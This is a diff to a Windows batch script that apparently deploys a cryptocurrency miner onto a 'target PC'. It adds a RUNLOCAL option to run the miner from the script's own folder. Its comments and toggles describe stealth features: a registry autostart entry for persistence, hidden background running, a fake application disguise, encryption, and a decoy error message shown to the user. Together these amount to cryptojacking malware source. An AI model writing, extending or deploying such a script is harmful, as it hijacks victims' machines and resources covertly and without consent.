@@ -9,6 +9,8 @@ REM ============================================================================
 REM ---------------------------[ FEATURES/TOGGLES ]-----------------------------
 REM ============================================================================
 REM 
+REM RUNLOCAL     - RUNS THE MINER IN THE LOCAL DIRECTORY. - NOTHING IS
+REM                TRANSFERED TO TARGET PC.
 REM AUTOSTART    - CREATES A REGISTRY ENTRY TO START A GENERATED BATCH
 REM                FILE IN THE TARGET PC'S FOLDER.
 REM BACKGROUND   - RUNS THE MINER IN THE BACKGROUND WITHOUT DISPLAYING
@@ -39,6 +41,7 @@ REM               is located inside.
 REM ============================================================================
 REM TOGGLES FOR EASE OF MANIPULATION OF SCRIPT. 
 REM ============================================================================
+SET "RUNLOCAL=YES"
 SET "BACKGROUND=NO"
 SET "ENCRYPTION=NO"
 SET "FAKEAPP=NO"
@@ -132,6 +135,7 @@ SET "UNHIDE=attrib -s -h"
 SET "ERRORTXT=Your System Specifications does not meet the necessary Requirements."
 REM Helper Variables for the script.
 SET "MINER=NULL"
+IF "%RUNLOCAL%" EQU "YES" SET "TARGETDIR=%~dp0"
 IF "%AUTOSTART%" EQU "YES" (SET "AUTOSTART=1") ELSE (SET "AUTOSTART=0")
 IF "%ENCRYPTION%" EQU "YES" (SET "ENCRYPTION=1") ELSE (SET "ENCRYPTION=0")
 IF "%BACKGROUND%" EQU "YES" (SET "BACKGROUND=1") ELSE (SET "BACKGROUND=0")
